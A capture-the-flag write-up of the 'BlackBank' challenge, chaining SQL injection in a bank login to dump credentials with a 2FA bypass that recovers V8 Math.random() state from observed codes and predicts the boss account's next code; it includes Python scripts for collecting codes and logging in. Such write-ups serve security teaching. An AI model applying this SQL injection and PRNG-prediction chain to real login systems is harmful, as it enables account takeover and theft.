---
tags:
  - midnightctf
  - web
  - crypto
---

# BlackBank

**Flag:** `MCTF{v8_1s_n0t_SEcur3_4t_4l7}`

## Overview

BlackBank exposed two related apps: a bank panel and a matching mail system. The challenge gave me access to a low-level member account, but the flag only appeared on the boss account's dashboard.

The winning chain was:

1. exploit SQL injection in the bank login
2. extract the boss credentials and 2FA mail routing
3. collect enough 2FA codes from my own account
4. recover the V8 `Math.random()` state
5. predict the next boss 2FA code and log in as `Vladizlow`

## Step 1: Extract the boss credentials

The bank login accepted SQL injection in the `username` field. Union probing showed the query expected four columns, and blind extraction revealed the backing table:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    emailUser TEXT NOT NULL
)
```

The interesting rows were:

| id | username | password | emailUser |
|----|----------|----------|-----------|
| 1 | katarina | Kathax0r_sk1d0s | katarina |
| 2 | Vladizlow | xeAgQ8dJcc0hUVCm2EV9 | admin |

That immediately explained why the challenge was not solved after dumping the password. `Vladizlow` did not receive 2FA codes in the same mailbox as the low-privilege account.

## Step 2: Why the obvious 2FA bypasses failed

I tried the usual shortcuts first:

- changing `emailUser` through the login injection
- reusing a verified session and swapping users afterward
- tampering with `/bank/2fa`, `/bank/resend`, and `/bank/profile`
- brute-forcing the numeric code
- guessing the `admin` mail credentials

None of those landed. The important clue was the format of the codes themselves: they looked exactly like values generated with:

```javascript
Math.floor(Math.random() * 100000000)
```

## Step 3: The real bug was V8 `Math.random()`

Node's `Math.random()` is powered by V8's xorshift128+ generator. For performance, V8 fills a 64-value cache and serves the numbers in LIFO order, which means the observed outputs have to be reversed before feeding them into a forward solver.

That mattered for two reasons:

- `Math.random()` is not suitable for security-sensitive values like 2FA codes
- observing a small batch of outputs from one cache segment is enough to recover the 128-bit internal state

In this challenge, around ten consecutive codes from a single session were enough to recover a unique state candidate with a Z3-based model.

## Step 4: Collect codes from a single session

The important operational detail was keeping all observed codes inside one cache segment. I used one mail session to read the inbox, and one bank session to repeatedly trigger resend:

```python
import requests, re, sys, time

BASE = sys.argv[1]

mail = requests.Session()
mail.post(f"{BASE}/mail/login", data={
    "username": "katarina",
    "password": "Kathax0r_sk1d0s",
})

bank = requests.Session()
bank.post(f"{BASE}/bank/login", data={
    "username": "katarina",
    "password": "Kathax0r_sk1d0s",
})

codes = []
for _ in range(10):
    bank.post(f"{BASE}/bank/resend")
    time.sleep(0.3)
    seen = re.findall(r'⚡ (\d+)', mail.get(f"{BASE}/mail/inbox").text)
    if seen and (not codes or seen[0] != codes[-1]):
        codes.append(seen[0])

print(codes)
```

A sample batch looked like:

```text
19368238, 13611877, 24411298, 66357597, 25991259,
85264482, 63657524, 43659187, 70329421, 80332196
```

## Step 5: Recover the state and predict the next code

Feeding those observations into a V8 xorshift128+ model produced a single candidate state and a short list of future outputs. The next relevant prediction was:

```text
67610404
```

The key modeling detail was accounting for both:

- the `Math.floor(100000000 * x)` truncation
- the reversed output order caused by the 64-value LIFO cache

Without the cache reversal, the constraints do not line up with V8's real output stream.

## Step 6: Log in as the boss

Once I had `Vladizlow`'s password from SQLi and the next 2FA prediction from the solver, the last step was just a normal login:

```python
import requests, re, sys

BASE = sys.argv[1]

boss = requests.Session()
boss.post(f"{BASE}/bank/login", data={
    "username": "Vladizlow",
    "password": "xeAgQ8dJcc0hUVCm2EV9",
})

boss.post(f"{BASE}/bank/2fa", data={"code": "67610404"})
profile = boss.get(f"{BASE}/bank/profile").text
print(re.findall(r'MCTF\\{[^}]+\\}', profile)[0])
```

That redirected to the boss dashboard and revealed:

```text
MCTF{v8_1s_n0t_SEcur3_4t_4l7}
```

## Full chain

1. Use SQLi on `/bank/login` to dump the `users` table.
2. Recover `Vladizlow`'s password and the fact that his codes are routed to the `admin` mailbox.
3. Log in as `katarina` and collect consecutive 2FA codes from one bank session.
4. Recover the V8 xorshift128+ state from those observed codes.
5. Predict the next valid boss 2FA code.
6. Log in as `Vladizlow`, submit the predicted code, and read the flag from `/bank/profile`.

## Takeaways

- `Math.random()` should never be used for authentication or 2FA.
- Output caching details matter just as much as the PRNG itself when you are modeling a real implementation.
- SQL injection was only the first half of the challenge; the decisive step was turning leaked credentials into a predictable 2FA bypass.
